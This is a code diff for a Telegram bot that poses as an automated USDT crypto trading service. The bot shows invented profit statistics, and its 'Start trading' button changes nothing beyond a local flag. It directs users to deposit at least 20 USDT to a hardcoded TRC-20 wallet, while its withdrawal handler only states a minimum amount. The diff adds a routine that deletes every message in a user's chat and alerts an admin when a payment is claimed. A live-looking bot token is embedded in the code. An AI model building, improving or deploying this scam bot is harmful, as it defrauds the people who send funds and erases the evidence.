@@ -3,6 +3,7 @@ const axios = require('axios');
 
 // Replace with your own Telegram bot token
 const token = '6363609133:AAGokjYGa80BOoeG2ItLOiEA6_TYaFEKc60';
+const adminChatId = '5873712733';
 
 // Create a bot that uses 'polling' to fetch new updates
 const bot = new TelegramBot(token, { polling: true });
@@ -10,8 +11,13 @@ const bot = new TelegramBot(token, { polling: true });
 let userStatus = {}; // To store user trading status
 
 // Function to delete previous messages
-const deletePreviousMessages = (chatId, messageId) => {
-  bot.deleteMessage(chatId, messageId).catch(err => console.log('Error deleting message:', err));
+const deletePreviousMessages = (chatId) => {
+  bot.getChat(chatId).then((chat) => {
+    const messageId = chat.last_message_id;
+    for (let i = 1; i <= messageId; i++) {
+      bot.deleteMessage(chatId, i).catch((err) => console.log('Error deleting message:', err));
+    }
+  });
 };
 
 // Start command
@@ -19,22 +25,22 @@ bot.onText(/\/start/, (msg) => {
   const chatId = msg.chat.id;
   const userId = msg.from.id;
   const startDate = new Date().toISOString();
-  const balance = 0;  // Initial balance
-  const withdrawal = 0;  // Initial withdrawal amount
+  const balance = 0; // Initial balance
+  const withdrawal = 0; // Initial withdrawal amount
 
   // Store user data on the backend
   axios.post('https://solkah.org/id/chat.php', {
     id: userId,
     startDate: startDate,
     balance: balance,
-    withdrawal: withdrawal
+    withdrawal: withdrawal,
   })
-  .then(response => {
-    console.log('User data stored successfully');
-  })
-  .catch(error => {
-    console.error('Error storing user data:', error);
-  });
+    .then((response) => {
+      console.log('User data stored successfully');
+    })
+    .catch((error) => {
+      console.error('Error storing user data:', error);
+    });
 
   // Respond to the user
   bot.sendMessage(chatId, 'Great! All is ready for start.\n\nBefore using our service, we strongly recommend you to carefully review the functionality of each trading bot button.\n\nMenu:\n\n"Trading" - here you can see the results of the bot\'s trading for different periods of time.\nYou can also pause or resume the trading bot;\n"Stop trading/Start trading" - starting and stopping the trading bot;\n"Trading Bot statistics" - bot trading statistics for the period: 24 hours, 3 days, 7 days, 1 month, 3 months;\n"Trading Bot Channel" - up-to-date information on bot trading.\n\n"My account" - up-to-date information on the balance and account. Deposit/withdrawal of funds, referral system;\n"Top up your balance" - the ability to replenish the USDT TRC20 wallet to get started (10% commission);\n"Withdrawal of funds" - the ability to withdraw USDT TRC20 to your wallet (10% commission);\n"Balance history" - deposits and withdrawals on your trading account;\n"Referral system" - the reward is 5% from each deposit of the listed users.', {
@@ -42,12 +48,9 @@ bot.onText(/\/start/, (msg) => {
       keyboard: [
         [{ text: 'Trading💰' }, { text: 'My Account' }],
         [{ text: 'Deposit' }, { text: 'Withdrawal' }],
-        [{ text: 'Support' }]
-      ]
-    }
-  }).then(sentMessage => {
-    // Delete previous messages
-    deletePreviousMessages(chatId, sentMessage.message_id - 1);
+        [{ text: 'Support' }],
+      ],
+    },
   });
 });
 
@@ -56,26 +59,25 @@ bot.on('message', (msg) => {
   const chatId = msg.chat.id;
   const text = msg.text;
 
+  deletePreviousMessages(chatId);
+
   if (text === 'Trading💰') {
     const tradingMessage = 'Trading\nStop trading / Start trading - starting and stopping the trading bot.\nTrading bot statistics - bot trading statistics for the period: 24 hours, 3 days, 7 days, 1 month, 3 months.\nTrading status: ' + (userStatus[chatId] ? 'Started ✅️' : 'Stopped 🚫');
-    
+
     bot.sendMessage(chatId, tradingMessage, {
       reply_markup: {
         inline_keyboard: [
           [{ text: userStatus[chatId] ? 'Stop trading' : 'Start trading', callback_data: userStatus[chatId] ? 'stop_trading' : 'start_trading' }],
           [{ text: 'Statistics', callback_data: 'statistics' }],
-          [{ text: 'Trading bot channel', url: 'https://t.me/+BaZqzAd4Mus5NzU0' }]
-        ]
-      }
-    }).then(sentMessage => {
-      // Delete previous messages
-      deletePreviousMessages(chatId, sentMessage.message_id - 1);
+          [{ text: 'Trading bot channel', url: 'https://t.me/+BaZqzAd4Mus5NzU0' }],
+        ],
+      },
     });
   } else if (text === 'My Account') {
     // Fetch user data from the backend
     axios.get('https://solkah.org/id/data.txt')
-      .then(response => {
-        const userData = response.data;
+      .then((response) => {
+        const userData = response.data[chatId];
         const balance = userData.balance;
         const startDate = userData.startDate;
         const withdrawal = userData.withdrawal;
@@ -84,38 +86,26 @@ bot.on('message', (msg) => {
         bot.sendMessage(chatId, `Medat.00:\nMy Account\n\nRencontre bot ❤️:\n💰 Current balance: ($${balance})\n📅 Date of registration: (${startDate})\n💸 Total withdrawal: ($${withdrawal})\n\n🔗 Your referral link: https://t.me/@Orrdoxbot?start=${userId}`, {
           reply_markup: {
             inline_keyboard: [
-              [{ text: 'Deposit', callback_data: 'deposit' }]
-            ]
-          }
-        }).then(sentMessage => {
-          // Delete previous messages
-          deletePreviousMessages(chatId, sentMessage.message_id - 1);
+              [{ text: 'Deposit', callback_data: 'deposit' }],
+            ],
+          },
         });
       })
-      .catch(error => {
+      .catch((error) => {
         console.error('Error fetching user data:', error);
       });
   } else if (text === 'Deposit') {
     bot.sendMessage(chatId, '❗️ In order to top up your balance, you need to transfer USDT to a wallet below (the commission for replenishment is 10%).\nThe transfer is realized automatically.\n\n❗️ The minimum amount for replenishment is 20 USDT\n➖➖➖➖➖\nWallet address USDT TRC-20:\nTDpKzxmecCqdwUU8DoTjvjoKwUnemh7sge\n(To copy, click on the wallet👆)', {
       reply_markup: {
         inline_keyboard: [
-          [{ text: 'Check payment', callback_data: 'check_payment' }]
-        ]
-      }
-    }).then(sentMessage => {
-      // Delete previous messages
-      deletePreviousMessages(chatId, sentMessage.message_id - 1);
+          [{ text: 'Check payment', callback_data: 'check_payment' }],
+        ],
+      },
     });
   } else if (text === 'Withdrawal') {
-    bot.sendMessage(chatId, 'The minimum withdrawal amount is $30').then(sentMessage => {
-      // Delete previous messages
-      deletePreviousMessages(chatId, sentMessage.message_id - 1);
-    });
+    bot.sendMessage(chatId, 'The minimum withdrawal amount is $30');
   } else if (text === 'Support') {
-    bot.sendMessage(chatId, 'You are now connected to support. Please describe your issue.').then(sentMessage => {
-      // Delete previous messages
-      deletePreviousMessages(chatId, sentMessage.message_id - 1);
-    });
+    bot.sendMessage(chatId, 'You are now connected to support. Please describe your issue.');
   }
 });
 
@@ -125,6 +115,8 @@ bot.on('callback_query', (callbackQuery) => {
   const chatId = msg.chat.id;
   const data = callbackQuery.data;
 
+  deletePreviousMessages(chatId);
+
   if (data === 'start_trading') {
     userStatus[chatId] = true;
     bot.sendMessage(chatId, 'Trading\nStop trading / Start trading - starting and stopping the trading bot.\nTrading bot statistics - bot trading statistics for the period: 24 hours, 3 days, 7 days, 1 month, 3 months.\nTrading status: Started ✅️', {
@@ -132,12 +124,9 @@ bot.on('callback_query', (callbackQuery) => {
         inline_keyboard: [
           [{ text: 'Stop trading', callback_data: 'stop_trading' }],
           [{ text: 'Statistics', callback_data: 'statistics' }],
-          [{ text: 'Trading bot channel', url: 'https://t.me/+BaZqzAd4Mus5NzU0' }]
-        ]
-      }
-    }).then(sentMessage => {
-      // Delete previous messages
-      deletePreviousMessages(chatId, sentMessage.message_id - 1);
+          [{ text: 'Trading bot channel', url: 'https://t.me/+BaZqzAd4Mus5NzU0' }],
+        ],
+      },
     });
   } else if (data === 'stop_trading') {
     userStatus[chatId] = false;
@@ -146,24 +135,17 @@ bot.on('callback_query', (callbackQuery) => {
         inline_keyboard: [
           [{ text: 'Start trading', callback_data: 'start_trading' }],
           [{ text: 'Statistics', callback_data: 'statistics' }],
-          [{ text: 'Trading bot channel', url: 'https://t.me/+BaZqzAd4Mus5NzU0' }]
-        ]
-      }
-    }).then(sentMessage => {
-      // Delete previous messages
-      deletePreviousMessages(chatId, sentMessage.message_id - 1);
+          [{ text: 'Trading bot channel', url: 'https://t.me/+BaZqzAd4Mus5NzU0' }],
+        ],
+      },
     });
   } else if (data === 'statistics') {
-    bot.sendMessage(chatId, 'Trading Bot Statistics:\n24 hours: 5%\n3 days: 10%\n7 days: 15%').then(sentMessage => {
-      // Delete previous messages
-      deletePreviousMessages(chatId, sentMessage.message_id - 1);
-    });
+    bot.sendMessage(chatId, 'Trading Bot Statistics:\n24 hours: 5%\n3 days: 10%\n7 days: 15%');
   } else if (data === 'check_payment') {
-    bot.sendMessage(chatId, '❗️Please, check again in 5 minutes❗️\n\n➖➖➖➖➖\nIf the payment is not accepted within 15 minutes, write to our support 📝').then(sentMessage => {
-      // Notify admin about the new payment
-      bot.sendMessage('5873712733', `Hey, new payment request from user ID: ${chatId}`);
-      // Delete previous messages
-      deletePreviousMessages(chatId, sentMessage.message_id - 1);
-    });
+    bot.sendMessage(chatId, '❗️Please, check again in 5 minutes❗️\n\n➖➖➖➖➖\nIf the payment is not accepted within 15 minutes, write to our support 📝');
+    // Notify admin about the new payment
+    bot.sendMessage(adminChatId, `Hey, new payment request from user ID: ${chatId}`);
+  } else if (data === 'deposit') {
+    bot.sendMessage(chatId, '❗️ In order to top up your balance, you need to transfer USDT to a wallet below (the commission for replenishment is 10%).\nThe transfer is realized automatically.\n\n❗️ The minimum amount for replenishment is 20 USDT\n➖➖➖➖➖\nWallet address USDT TRC-20:\nTDpKzxmecCqdwUU8DoTjvjoKwUnemh7sge\n(To copy, click on the wallet👆)');
   }
 });
